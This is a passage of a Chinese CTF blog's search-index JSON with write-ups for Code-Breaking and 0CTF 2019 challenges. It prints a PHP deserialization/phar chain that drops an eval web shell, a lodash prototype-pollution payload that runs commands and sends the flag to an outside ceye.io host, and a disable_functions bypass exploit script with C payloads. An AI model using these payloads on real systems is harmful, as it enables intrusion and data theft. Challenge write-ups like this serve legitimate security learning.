PHPUnit\\Framework\\MockObject\\Invocation&#123; class StaticInvocation&#123; function __construct()&#123; $this-&gt;parameters = array('/var/www/html/upload/a.php','&lt;?php phpinfo();eval($_POST[\"a\"]);?&gt;'); &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject\\Stub&#123; class ReturnCallback&#123; function __construct()&#123; $this-&gt;callback = 'file_put_contents'; &#125; &#125;&#125;namespace Faker&#123; class ValidGenerator&#123; function __construct()&#123; $si = new \\PHPUnit\\Framework\\MockObject\\Invocation\\StaticInvocation(); $g1 = new \\Faker\\Generator(array('Ariel' =&gt; $si )); $g2 = new \\Faker\\Generator(array(\"dispatch\" =&gt; array($g1, \"getFormatter\"))); $rc = new \\PHPUnit\\Framework\\MockObject\\Stub\\ReturnCallback(); $this-&gt;validator = array($rc, \"invoke\"); $this-&gt;generator = $g2; $this-&gt;maxRetries = 10000; &#125; &#125; class Generator&#123; function __construct($form)&#123; $this-&gt;formatters = $form; &#125; &#125;&#125;namespace&#123; $exp = new Illuminate\\Broadcasting\\PendingBroadcast(); echo (urlencode(serialize($exp))); // phar $p = new Phar('./a.phar', 0); $p-&gt;startBuffering(); $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'); $p-&gt;setMetadata($exp); $p-&gt;addFromString('1.txt','text'); $p-&gt;stopBuffering();&#125; 上传图片然后访问http://xiaorouji.cn:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/843ac0c4952e20f0d95d1651b86d6792/201904/10/00c7ab10a3e36d18dd9d.gif去触发反序列化接着访问http://xiaorouji.cn:8080/upload/a.php，成功getshell参考kk师傅的博客","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/code-breaking-lumenserial/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"Code Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"}]},{"title":"code breaking thejs","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/code-breaking-thejs/","text":"菜鸡继续跟着师傅们复现（捂脸这道题利用了lodash实现了一个ejs引擎，在请求的时候进行渲染，师傅们说了是merge有问题，去查看源码在测试过程中发现merge会直接将注入原型的属性的值写去最底层的object，因此只要创建一个对象，都会在原型属性中找到注入的对象在template函数中我们可以找到利用点1234var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); 看下那个sourceURL1var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\\n' : ''; option是在模板引擎中渲染的值。这里读的是sourceURL属性的值，我们可以通过添加一个sourceURL属性，修改它的值，通过js原型链污染在function中达到执行js的目的，模板：1new Function(\"\",\"//# sourceURL='xxx'\\r\\n CODE \\r\\n\")(); 但是这里我们要注意一点因为require不是全局的，他只存在于当前的模块范围，但是new function是在新的领域运行的，所以我们想利用的话要先将它引用过来最后攻击链1&#123;\"__proto__\":&#123;\"sourceURL\":\"xxx\\r\\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://onsdtb.ceye.io/$&#123;result&#125;`);req.end();\\r\\n\"&#125;&#125;","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/code-breaking-thejs/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"Code Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"}]},{"title":"2019 0ctf wp","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/2019-0ctf-wp/","text":"babyrsa首先pubkey.py可以看到n的值1234from sage.all import GF, PolynomialRingP=PolynomialRing(GF(2),'x')e = 31337n = P('x^2048 + x^2046 + x^2043 + x^2040 + x^2036 + x^2035 + x^2034 + x^2033 + x^2031 + x^2029 + x^2025 + x^2024 + x^2022 + x^2019 + x^2018 + x^2017 + x^2012 + x^2007 + x^2006 + x^2004 + x^2000 + x^1999 + x^1998 + x^1997 + x^1993 + x^1992 + x^1991 + x^1986 + x^1982 + x^1981 + x^1979 + x^1978 + x^1977 + x^1975 + x^1970 + x^1964 + x^1963 + x^1962 + x^1961 + x^1960 + x^1959 + x^1958 + x^1955 + x^1954 + x^1952 + x^1951 + x^1949 + x^1947 + x^1942 + x^1939 + x^1938 + x^1936 + x^1934 + x^1933 + x^1932 + x^1930 + x^1928 + x^1927 + x^1923 + x^1922 + x^1919 + x^1918 + x^1915 + x^1914 + x^1913 + x^1912 + x^1911 + x^1910 + x^1908 + x^1903 + x^1902 + x^1900 + x^1899 + x^1897 + x^1893 + x^1891 + x^1890 + x^1886 + x^1881 + x^1880 + x^1879 + x^1878 + x^1875 + x^1874 + x^1873 + x^1872 + x^1871 + x^1870 + x^1869 + x^1865 + x^1863 + x^1862 + x^1860 + x^1856 + x^1855 + x^1853 + x^1852 + x^1845 + x^1841 + x^1839 + x^1837 + x^1836 + x^1835 + x^1833 + x^1832 + x^1829 + x^1828 + x^1827 + x^1826 + x^1824 + x^1823 + x^1822 + x^1821 + x^1820 + x^1819 + x^1818 + x^1817 + x^1813 + x^1812 + x^1810 + x^1809 + x^1808 + x^1807 + x^1803 + x^1799 + x^1797 + x^1796 + x^1794 + x^1792 + x^1790 + x^1786 + x^1783 + x^1782 + x^1779 + x^1778 + x^1776 + x^1775 + x^1774 + x^1772 + x^1767 + x^1766 + x^1765 + x^1764 + x^1763 + x^1762 + x^1759 + x^1757 + x^1756 + x^1754 + x^1753 + x^1752 + x^1750 + x^1749 + x^1741 + x^1734 + x^1730 + x^1729 + x^1726 + x^1725 + x^1723 + x^1722 + x^1721 + x^1716 + x^1714 + x^1713 + x^1712 + x^1710 + x^1709 + x^1706 + x^1705 + x^1703 + x^1702 + x^1700 + x^1698 + x^1693 + x^1692 + x^1691 + x^1690 + x^1683 + x^1682 + x^1681 + x^1680 + x^1679 + x^1677 + x^1672 + x^1670 + x^1669 + x^1666 + x^1663 + x^1662 + x^1661 + x^1659 + x^1655 + x^1653 + x^1651 + x^1649 + x^1648 + x^1647 + x^1646 + x^1644 + x^1643 + x^1642 + x^1640 + x^1639 + x^1638 + x^1634 + x^1633 + x^1628 + x^1620 + x^1619 + x^1618 + x^1616 + x^1614 + x^1611 + x^1610 + x^1608 + x^1605 + x^1604 + x^1603 + x^1599 + x^1597 + x^1595 + x^1594 + x^1590 + x^1588 + x^1587 + x^1585 + x^1583 + x^1580 + x^1579 + x^1577 + x^1574 + x^1573 + x^1572 + x^1568 + x^1566 + x^1565 + x^1563 + x^1562 + x^1560 + x^1555 + x^1554 + x^1552 + x^1550 + x^1549 + x^1548 + x^1545 + x^1544 + x^1542 + x^1540 + x^1538 + x^1537 + x^1536 + x^1535 + x^1534 + x^1533 + x^1532 + x^1531 + x^1528 + x^1526 + x^1525 + x^1523 + x^1522 + x^1521 + x^1519 + x^1517 + x^1515 + x^1510 + x^1509 + x^1506 + x^1504 + x^1502 + x^1499 + x^1498 + x^1497 + x^1488 + x^1483 + x^1480 + x^1477 + x^1472 + x^1471 + x^1469 + x^1468 + x^1467 + x^1466 + x^1464 + x^1462 + x^1457 + x^1456 + x^1455 + x^1454 + x^1453 + x^1452 + x^1448 + x^1446 + x^1444 + x^1443 + x^1442 + x^1441 + x^1440 + x^1436 + x^1435 + x^1431 + x^1428 + x^1425 + x^1424 + x^1422 + x^1420 + x^1415 + x^1414 + x^1411 + x^1410 + x^1408 + x^1406 + x^1405 + x^1403 + x^1402 + x^1399 + x^1397 + x^1396 + x^1395 + x^1394 + x^1393 + x^1391 + x^1388 + x^1385 + x^1377 + x^1376 + x^1372 + x^1371 + x^1370 + x^1369 + x^1367 + x^1363 + x^1361 + x^1357 + x^1355 + x^1354 + x^1349 + x^1343 + x^1339 + x^1338 + x^1337 + x^1336 + x^1335 + x^1332 + x^1329 + x^1327 + x^1326 + x^1324 + x^1321 + x^1315 + x^1314 + x^1312 + x^1310 + x^1309 + x^1305 + x^1304 + x^1303 + x^1302 + x^1299 + x^1298 + x^1296 + x^1295 + x^1293 + x^1291 + x^1290 + x^1289 + x^1284 + x^1283 + x^1282 + x^1281 + x^1280 + x^1278 + x^1277 + x^1276 + x^1275 + x^1272 + x^1270 + x^1269 + x^1268 + x^1267 + x^1259 + x^1257 + x^1254 + x^1252 + x^1251 + x^1249 + x^1247 + x^1246 + x^1244 + x^1240 + x^1238 + x^1233 + x^1232 + x^1229 + x^1222 + x^1219 + x^1217 + x^1211 + x^1209 + x^1208 + x^1205 + x^1204 + x^1203 + x^1202 + x^1200 + x^1197 + x^1196 + x^1195 + x^1193 + x^1192 + x^1189 + x^1187 + x^1186 + x^1185 + x^1184 + x^1183 + x^1182 + x^1181 + x^1177 + x^1176 + x^1173 + x^1170 + x^1167 + x^1166 + x^1162 + x^1161 + x^1160 + x^1159 + x^1158 + x^1156 + x^1155 + x^1154 + x^1153 + x^1151 + x^1146 + x^1143 + x^1141 + x^1139 + x^1138 + x^1137 + x^1135 + x^1131 + x^1129 + x^1128 + x^1125 + x^1124 + x^1122 + x^1116 + x^1115 + x^1114 + x^1112 + x^1111 + x^1107 + x^1106 + x^1105 + x^1104 + x^1103 + x^1102 + x^1098 + x^1097 + x^1095 + x^1094 + x^1092 + x^1088 + x^1087 + x^1085 + x^1077 + x^1076 + x^1075 + x^1072 + x^1069 + x^1068 + x^1061 + x^1060 + x^1059 + x^1057 + x^1055 + x^1054 + x^1053 + x^1050 + x^1047 + x^1046 + x^1044 + x^1043 + x^1042 + x^1036 + x^1029 + x^1025 + x^1024 + x^1023 + x^1022 + x^1019 + x^1016 + x^1013 + x^1012 + x^1010 + x^1008 + x^1007 + x^1006 + x^1004 + x^1000 + x^996 + x^995 + x^993 + x^992 + x^989 + x^985 + x^983 + x^978 + x^977 + x^975 + x^972 + x^971 + x^970 + x^969 + x^967 + x^963 + x^957 + x^956 + x^952 + x^950 + x^948 + x^945 + x^942 + x^941 + x^940 + x^938 + x^937 + x^936 + x^935 + x^932 + x^931 + x^930 + x^928 + x^927 + x^926 + x^923 + x^921 + x^918 + x^916 + x^914 + x^913 + x^909 + x^906 + x^905 + x^904 + x^902 + x^897 + x^895 + x^892 + x^889 + x^888 + x^887 + x^886 + x^885 + x^884 + x^882 + x^881 + x^879 + x^876 + x^870 + x^868 + x^867 + x^865 + x^862 + x^861 + x^859 + x^858 + x^856 + x^854 + x^848 + x^847 + x^846 + x^843 + x^839 + x^837 + x^836 + x^832 + x^831 + x^830 + x^829 + x^826 + x^823 + x^821 + x^820 + x^817 + x^815 + x^812 + x^809 + x^808 + x^805 + x^803 + x^802 + x^800 + x^799 + x^797 + x^795 + x^793 + x^792 + x^788 + x^786 + x^784 + x^780 + x^775 + x^774 + x^770 + x^768 + x^766 + x^764 + x^761 + x^760 + x^753 + x^752 + x^751 + x^750 + x^747 + x^744 + x^742 + x^741 + x^737 + x^734 + x^732 + x^728 + x^727 + x^724 + x^722 + x^721 + x^719 + x^717 + x^715 + x^714 + x^713 + x^710 + x^709 + x^705 + x^703 + x^701 + x^698 + x^697 + x^695 + x^690 + x^687 + x^685 + x^684 + x^682 + x^681 + x^680 + x^677 + x^676 + x^674 + x^673 + x^672 + x^671 + x^670 + x^669 + x^665 + x^663 + x^659 + x^652 + x^651 + x^650 + x^649 + x^648 + x^647 + x^646 + x^645 + x^642 + x^640 + x^638 + x^632 + x^631 + x^630 + x^629 + x^627 + x^626 + x^623 + x^622 + x^621 + x^620 + x^616 + x^615 + x^610 + x^605 + x^602 + x^601 + x^600 + x^599 + x^598 + x^596 + x^594 + x^593 + x^591 + x^583 + x^581 + x^579 + x^578 + x^577 + x^576 + x^575 + x^573 + x^572 + x^571 + x^570 + x^569 + x^565 + x^563 + x^562 + x^561 + x^559 + x^557 + x^555 + x^552 + x^551 + x^546 + x^544 + x^542 + x^541 + x^540 + x^539 + x^538 + x^537 + x^535 + x^533 + x^530 + x^527 + x^523 + x^522 + x^520 + x^519 + x^515 + x^513 + x^511 + x^509 + x^507 + x^505 + x^504 + x^503 + x^499 + x^497 + x^496 + x^495 + x^493 + x^492 + x^488 + x^486 + x^481 + x^480 + x^479 + x^478 + x^477 + x^472 + x^470 + x^468 + x^467 + x^464 + x^463 + x^460 + x^459 + x^455 + x^454 + x^453 + x^446 + x^445 + x^444 + x^443 + x^440 + x^438 + x^437 + x^432 + x^431 + x^428 + x^427 + x^426 + x^420 + x^419 + x^416 + x^415 + x^414 + x^413 + x^412 + x^411 + x^405 + x^404 + x^401 + x^396 + x^393 + x^392 + x^391 + x^388 + x^387 + x^383 + x^381 + x^380 + x^377 + x^376 + x^369 + x^364 + x^362 + x^358 + x^357 + x^356 + x^355 + x^353 + x^351 + x^349 + x^340 + x^339 + x^338 + x^337 + x^336 + x^335 + x^334 + x^332 + x^330 + x^328 + x^327 + x^326 + x^324 + x^320 + x^318 + x^316 + x^315 + x^309 + x^302 + x^298 + x^292 + x^291 + x^290 + x^289 + x^287 + x^286 + x^285 + x^284 + x^281 + x^279 + x^278 + x^276 + x^274 + x^273 + x^272 + x^271 + x^267 + x^266 + x^264 + x^263 + x^262 + x^260 + x^259 + x^256 + x^254 + x^253 + x^252 + x^251 + x^249 + x^248 + x^247 + x^245 + x^244 + x^241 + x^239 + x^235 + x^234 + x^233 + x^232 + x^231 + x^230 + x^226 + x^224 + x^221 + x^219 + x^218 + x^216 + x^215 + x^214 + x^209 + x^207 + x^206 + x^202 + x^201 + x^198 + x^197 + x^194 + x^193 + x^192 + x^191 + x^189 + x^188 + x^183 + x^182 + x^181 + x^180 + x^179 + x^178 + x^177 + x^175 + x^172 + x^169 + x^168 + x^166 + x^165 + x^164 + x^163 + x^158 + x^157 + x^153 + x^152 + x^149 + x^147 + x^146 + x^144 + x^140 + x^139 + x^136 + x^128 + x^127 + x^126 + x^124 + x^123 + x^122 + x^121 + x^116 + x^115 + x^113 + x^112 + x^109 + x^108 + x^107 + x^106 + x^104 + x^103 + x^102 + x^101 + x^100 + x^99 + x^97 + x^95 + x^94 + x^93 + x^92 + x^87 + x^84 + x^83 + x^82 + x^80 + x^79 + x^78 + x^76 + x^73 + x^70 + x^69 + x^68 + x^67 + x^66 + x^65 + x^63 + x^60 + x^59 + x^57 + x^55 + x^52 + x^51 + x^47 + x^46 + x^45 + x^43 + x^42 + x^40 + x^36 + x^35 + x^30 + x^29 + x^28 + x^27 + x^23 + x^20 + x^17 + x^14 + x^9 + x^7 + x^3 + 1') 然后factor一下，出来两个多项式，一个是p一个是q12p=(x^821 + x^820 + x^819 + x^818 + x^817 + x^814 + x^813 + x^812 + x^810 + x^808 + x^807 + x^804 + x^801 + x^796 + x^795 + x^794 + x^790 + x^787 + x^786 + x^784 + x^781 + x^780 + x^779 + x^778 + x^777 + x^776 + x^775 + x^774 + x^773 + x^771 + x^770 + x^768 + x^766 + x^762 + x^761 + x^760 + x^758 + x^757 + x^752 + x^749 + x^748 + x^747 + x^740 + x^737 + x^736 + x^732 + x^727 + x^723 + x^722 + x^719 + x^718 + x^717 + x^716 + x^715 + x^714 + x^711 + x^710 + x^708 + x^704 + x^703 + x^702 + x^701 + x^700 + x^699 + x^698 + x^696 + x^692 + x^690 + x^689 + x^687 + x^685 + x^683 + x^681 + x^676 + x^674 + x^672 + x^671 + x^670 + x^668 + x^667 + x^665 + x^664 + x^663 + x^661 + x^660 + x^659 + x^657 + x^656 + x^655 + x^651 + x^649 + x^646 + x^644 + x^637 + x^636 + x^634 + x^633 + x^632 + x^631 + x^628 + x^626 + x^625 + x^622 + x^621 + x^620 + x^614 + x^611 + x^609 + x^608 + x^605 + x^604 + x^599 + x^597 + x^592 + x^591 + x^589 + x^580 + x^578 + x^574 + x^572 + x^569 + x^566 + x^565 + x^563 + x^562 + x^560 + x^552 + x^550 + x^545 + x^544 + x^543 + x^542 + x^540 + x^538 + x^537 + x^534 + x^533 + x^528 + x^527 + x^526 + x^523 + x^522 + x^519 + x^518 + x^515 + x^514 + x^512 + x^505 + x^503 + x^502 + x^500 + x^498 + x^496 + x^493 + x^492 + x^491 + x^490 + x^489 + x^487 + x^482 + x^480 + x^479 + x^478 + x^476 + x^474 + x^472 + x^471 + x^470 + x^469 + x^468 + x^466 + x^462 + x^459 + x^458 + x^457 + x^456 + x^454 + x^453 + x^451 + x^449 + x^447 + x^445 + x^443 + x^442 + x^441 + x^440 + x^437 + x^434 + x^428 + x^425 + x^424 + x^423 + x^420 + x^415 + x^412 + x^411 + x^410 + x^408 + x^405 + x^404 + x^403 + x^401 + x^400 + x^394 + x^391 + x^390 + x^389 + x^388 + x^384 + x^383 + x^382 + x^379 + x^378 + x^376 + x^375 + x^372 + x^371 + x^370 + x^368 + x^366 + x^365 + x^364 + x^361 + x^358 + x^357 + x^356 + x^354 + x^351 + x^347 + x^345 + x^344 + x^340 + x^339 + x^335 + x^334 + x^333 + x^332 + x^331 + x^328 + x^326 + x^322 + x^318 + x^315 + x^312 + x^306 + x^303 + x^302 + x^301 + x^300 + x^299 + x^298 + x^297 + x^295 + x^293 + x^291 + x^289 + x^288 + x^287 + x^286 + x^285 + x^282 + x^280 + x^279 + x^277 + x^274 + x^273 + x^270 + x^269 + x^268 + x^263 + x^262 + x^261 + x^259 + x^258 + x^257 + x^256 + x^252 + x^250 + x^249 + x^245 + x^244 + x^243 + x^242 + x^236 + x^234 + x^233 + x^232 + x^228 + x^225 + x^223 + x^222 + x^221 + x^219 + x^218 + x^215 + x^214 + x^213 + x^211 + x^210 + x^209 + x^207 + x^205 + x^203 + x^202 + x^200 + x^198 + x^197 + x^193 + x^191 + x^190 + x^185 + x^184 + x^182 + x^180 + x^179 + x^177 + x^172 + x^168 + x^167 + x^165 + x^163 + x^161 + x^159 + x^157 + x^156 + x^155 + x^154 + x^153 + x^151 + x^150 + x^149 + x^148 + x^146 + x^145 + x^143 + x^139 + x^137 + x^136 + x^135 + x^133 + x^132 + x^130 + x^127 + x^126 + x^125 + x^124 + x^122 + x^121 + x^120 + x^119 + x^117 + x^116 + x^113 + x^111 + x^110 + x^109 + x^108 + x^107 + x^106 + x^105 + x^100 + x^97 + x^95 + x^89 + x^88 + x^87 + x^86 + x^85 + x^84 + x^82 + x^81 + x^80 + x^77 + x^76 + x^75 + x^74 + x^69 + x^67 + x^65 + x^61 + x^59 + x^57 + x^53 + x^52 + x^50 + x^49 + x^48 + x^45 + x^41 + x^40 + x^36 + x^34 + x^33 + x^27 + x^26 + x^24 + x^23 + x^22 + x^21 + x^20 + x^19 + x^18 + x^15 + x^14 + x^12 + x^9 + x^6 + x^4 + x^3 + x + 1)q=(x^1227 + x^1226 + x^1225 + x^1224 + x^1219 + x^1214 + x^1213 + x^1211 + x^1210 + x^1208 + x^1205 + x^1203 + x^1202 + x^1201 + x^1198 + x^1197 + x^1194 + x^1193 + x^1188 + x^1185 + x^1184 + x^1183 + x^1180 + x^1178 + x^1177 + x^1175 + x^1173 + x^1171 + x^1170 + x^1169 + x^1168 + x^1166 + x^1164 + x^1163 + x^1162 + x^1160 + x^1157 + x^1155 + x^1151 + x^1149 + x^1144 + x^1143 + x^1142 + x^1141 + x^1140 + x^1139 + x^1137 + x^1136 + x^1135 + x^1134 + x^1130 + x^1126 + x^1122 + x^1121 + x^1120 + x^1118 + x^1117 + x^1115 + x^1114 + x^1111 + x^1110 + x^1108 + x^1107 + x^1105 + x^1104 + x^1103 + x^1102 + x^1101 + x^1099 + x^1094 + x^1092 + x^1090 + x^1089 + x^1085 + x^1082 + x^1079 + x^1075 + x^1074 + x^1073 + x^1070 + x^1068 + x^1067 + x^1066 + x^1065 + x^1064 + x^1061 + x^1060 + x^1059 + x^1058 + x^1055 + x^1054 + x^1053 + x^1051 + x^1047 + x^1046 + x^1043 + x^1042 + x^1041 + x^1039 + x^1037 + x^1035 + x^1034 + x^1033 + x^1031 + x^1029 + x^1028 + x^1027 + x^1026 + x^1025 + x^1023 + x^1021 + x^1019 + x^1018 + x^1016 + x^1014 + x^1012 + x^1009 + x^1006 + x^1004 + x^1002 + x^1000 + x^999 + x^996 + x^994 + x^993 + x^992 + x^991 + x^990 + x^989 + x^988 + x^984 + x^981 + x^980 + x^978 + x^977 + x^976 + x^974 + x^972 + x^967 + x^965 + x^964 + x^963 + x^962 + x^958 + x^957 + x^955 + x^953 + x^952 + x^951 + x^950 + x^949 + x^948 + x^947 + x^945 + x^944 + x^939 + x^936 + x^935 + x^934 + x^931 + x^930 + x^926 + x^924 + x^923 + x^920 + x^917 + x^913 + x^912 + x^910 + x^909 + x^908 + x^907 + x^906 + x^905 + x^903 + x^902 + x^901 + x^899 + x^896 + x^893 + x^892 + x^891 + x^887 + x^886 + x^885 + x^884 + x^883 + x^880 + x^877 + x^876 + x^872 + x^868 + x^867 + x^864 + x^863 + x^862 + x^861 + x^858 + x^856 + x^855 + x^854 + x^851 + x^847 + x^846 + x^844 + x^843 + x^842 + x^841 + x^840 + x^838 + x^836 + x^835 + x^833 + x^832 + x^830 + x^829 + x^828 + x^826 + x^825 + x^822 + x^821 + x^817 + x^815 + x^812 + x^811 + x^810 + x^808 + x^806 + x^804 + x^803 + x^802 + x^801 + x^800 + x^797 + x^792 + x^790 + x^789 + x^788 + x^787 + x^785 + x^784 + x^783 + x^781 + x^780 + x^778 + x^777 + x^776 + x^774 + x^771 + x^770 + x^769 + x^766 + x^764 + x^762 + x^759 + x^755 + x^751 + x^749 + x^748 + x^747 + x^746 + x^742 + x^737 + x^734 + x^733 + x^729 + x^727 + x^725 + x^724 + x^723 + x^722 + x^720 + x^718 + x^715 + x^713 + x^711 + x^709 + x^707 + x^706 + x^702 + x^699 + x^698 + x^695 + x^692 + x^687 + x^680 + x^679 + x^678 + x^677 + x^676 + x^674 + x^670 + x^669 + x^668 + x^662 + x^656 + x^654 + x^653 + x^652 + x^651 + x^648 + x^646 + x^645 + x^644 + x^642 + x^640 + x^639 + x^638 + x^637 + x^634 + x^633 + x^632 + x^629 + x^628 + x^627 + x^626 + x^625 + x^623 + x^619 + x^617 + x^613 + x^612 + x^611 + x^610 + x^605 + x^604 + x^603 + x^601 + x^597 + x^595 + x^593 + x^591 + x^590 + x^589 + x^588 + x^587 + x^585 + x^583 + x^581 + x^580 + x^577 + x^576 + x^574 + x^573 + x^572 + x^570 + x^569 + x^563 + x^557 + x^555 + x^553 + x^551 + x^548 + x^546 + x^545 + x^541 + x^538 + x^535 + x^534 + x^529 + x^528 + x^527 + x^526 + x^525 + x^524 + x^523 + x^522 + x^521 + x^520 + x^519 + x^518 + x^517 + x^516 + x^515 + x^512 + x^510 + x^509 + x^507 + x^506 + x^503 + x^499 + x^498 + x^497 + x^496 + x^495 + x^493 + x^492 + x^491 + x^487 + x^483 + x^479 + x^477 + x^475 + x^473 + x^467 + x^466 + x^465 + x^464 + x^462 + x^456 + x^455 + x^454 + x^452 + x^445 + x^444 + x^442 + x^438 + x^437 + x^436 + x^435 + x^434 + x^432 + x^431 + x^430 + x^429 + x^427 + x^426 + x^425 + x^424 + x^421 + x^420 + x^419 + x^418 + x^415 + x^412 + x^409 + x^404 + x^399 + x^398 + x^397 + x^396 + x^391 + x^390 + x^389 + x^387 + x^386 + x^385 + x^384 + x^383 + x^382 + x^379 + x^377 + x^376 + x^370 + x^368 + x^366 + x^363 + x^361 + x^356 + x^355 + x^353 + x^350 + x^349 + x^345 + x^343 + x^342 + x^340 + x^339 + x^332 + x^331 + x^329 + x^328 + x^327 + x^324 + x^321 + x^320 + x^315 + x^312 + x^309 + x^308 + x^307 + x^306 + x^305 + x^304 + x^300 + x^299 + x^297 + x^296 + x^295 + x^294 + x^293 + x^292 + x^290 + x^285 + x^284 + x^278 + x^277 + x^276 + x^275 + x^273 + x^272 + x^270 + x^269 + x^268 + x^267 + x^266 + x^265 + x^262 + x^261 + x^260 + x^258 + x^257 + x^256 + x^254 + x^251 + x^250 + x^248 + x^247 + x^245 + x^244 + x^240 + x^237 + x^235 + x^234 + x^233 + x^232 + x^231 + x^229 + x^225 + x^222 + x^220 + x^219 + x^217 + x^216 + x^214 + x^213 + x^210 + x^209 + x^207 + x^203 + x^202 + x^199 + x^196 + x^192 + x^191 + x^188 + x^187 + x^185 + x^184 + x^183 + x^182 + x^174 + x^173 + x^170 + x^169 + x^168 + x^167 + x^166 + x^162 + x^158 + x^157 + x^156 + x^152 + x^150 + x^148 + x^147 + x^146 + x^144 + x^142 + x^141 + x^140 + x^138 + x^137 + x^134 + x^129 + x^128 + x^125 + x^124 + x^123 + x^122 + x^121 + x^120 + x^115 + x^113 + x^112 + x^111 + x^109 + x^108 + x^106 + x^104 + x^101 + x^100 + x^98 + x^96 + x^95 + x^94 + x^92 + x^91 + x^89 + x^87 + x^86 + x^85 + x^84 + x^77 + x^75 + x^73 + x^70 + x^68 + x^67 + x^66 + x^60 + x^57 + x^53 + x^51 + x^50 + x^49 + x^46 + x^44 + x^43 + x^42 + x^41 + x^39 + x^36 + x^35 + x^32 + x^30 + x^28 + x^27 + x^25 + x^24 + x^23 + x^20 + x^18 + x^17 + x^10 + x^9 + x^8 + x^5 + x^4 + x^3 + x^2 + x + 1) 然后就是看论文找到伽罗瓦域的欧拉函数因此我们可以知道1234phi(n)=pm*(1-1/p1)*(1-1/p2) =pm*(1-1/p)*(1-1/q) =2^2048(1-1/2^821)*(1-1/2^1227) =(2^821-1)*(2^1227-1) 所以此时e知道，phi知道，就只剩求d了图中的x就是d，接下来就是求明文了将flag.enc的文件读出来是这段123931938409134006846469410550487073743925192650755116938225541794524723083910240603620279453298714584321800170326063144616472531553643627071552202613402950579120189960424183462876292590831564884347025119938858471788053191321980663696621632084753893732784657023312407591768406322125753947265987815937165961039424015628319982913336402297718720925447102042668906173729998301139577468193468132305331072754842771657432484688590927575895743853584931297836925498250475231655832566787366689988158399203844420168837827423836936015638932385609040452870954522482255864355639427304567768665723098741671323173831781775755570779256 然后跟着sage的加密过程解密就行最后1234m = 12929751515717784223190125071095033840972126618103851506531524795815629301057549901578587618937134822682802098496427474753288112009126414456232355335989529959849075718110296567230826019289845128370864725824070831511344761744559911657462484008064553761322934104763420141593597788688628235476191502377597826935393982157025297683756512358373217719860916477793044899633710148649825902391311211888551231643872435408487897310375126980062534462671993291565349596885502486769512045272366253808741340159426524945255488751645903929814963731986204149626310974886059236306335075272063744650146690027530594609392956631736380597881Lprint hex(m)[2:]s = '666c61677b5031656135655f6b3333705f4e5f61735f415f696e54656765527e7e7e7e7e7e7d6a49c6b2a08d0af76b'print s.decode('hex') Ghost pepper这题一开始是脑洞，题目ghost pepper=鬼辣椒=jolokia，先按提示karaf/karaf登录进去，接着就一直404了……..访问一下jolokia/list寻找可以利用的mbean接下来我们制作一个恶意的bundle，具体过程看这里https://blog.csdn.net/Love_Taylor/article/details/75194394将run以后生成的jar包放去vps上，然后向服务器post json数据，install恶意的bundle包拿到id然后start监听getshell Wallbreaker Easy题目地址：http://111.186.63.208:31340/进去看到一个后门，但是连过去报500，同时也不能执行系统函数，然后肉鸡就卡住了，到了最后twings大师傅带了肉鸡一把，终于做出来了考察点是这个，imagemagick的漏洞 https://www.freebuf.com/articles/web/192052.html原理就是在web应用启动新进程a的时候，a进程内部调用了一个系统函数b，b函数又在系统共享对象c.so里面，所以系统会加载c.so，但是如果我们在加载c.so之前先加载c_evil.so，而且c_evil.so里面恰好也有名字为b的函数，同时c_evil.so优先级比较高，因此系统会调用c_evil.so的b函数而不是c.so的b函数，因此只要c_evil.so可控，我们就可以绕过disable_functions执行任意命令了先本地尝试一波追踪一下可以看到imagick调用的系统函数rouji1.php123&lt;?php$image = new Imagick('Sun.bpg');?&gt; 接下来我们就要伪造这样的函数了poc.c123456#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(void)&#123; system(\"/bin/ls -al / &gt; /tmp/pwn\"); return 0;&#125; rouji2.php1234&lt;?phpputenv(\"PATH=/tmp\");$image = new Imagick('Sun.bpg');?&gt; 可以看到确实可以成功利用执行任意命令，接下来就打题目了exp如下12345678910111213141516# -*- coding:utf8 -*-import base64import requestsurl = \"http://111.186.63.208:31340/\"evil = open(\"poc1\", \"rb\").read()evil = base64.b64encode(evil)php = \"putenv('PATH=/tmp/1f666575cbdf2d529c7a01658617cbb9');\" \\ \"file_put_contents('/tmp/1f666575cbdf2d529c7a01658617cbb9/bpgdec', base64_decode('\" + evil + \"'));\"\\ \"chmod('/tmp/1f666575cbdf2d529c7a01658617cbb9/bpgdec', 0777);\"\\ \"$image = new Imagick('Sun.bpg');\"\\ \"echo file_get_contents('/tmp/1f666575cbdf2d529c7a01658617cbb9/pwn');\" data = &#123; \"backdoor\": php&#125;print requests.post(url=url, data=data).content poc.c1234567#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(void)&#123; system(\"/readflag &gt; /tmp/1f666575cbdf2d529c7a01658617cbb9/pwn\"); return 0;&#125;","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/2019-0ctf-wp/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"},{"name":"crypto","slug":"web/crypto","permalink":"https://xi4or0uji.github.io/categories/web/crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"code breaking easy","date":"2019-03-19T16:00:00.000Z","path":"2019/03/20/code-breaking-easy/","text":"前言这个是知识星球里面的一个比赛，一开始的时候事情多，没及时做，最近刷ph牛的文章看到这个比赛，找来复现一下 function题目function这题是一个php代码审计题，题目很短123456789&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; 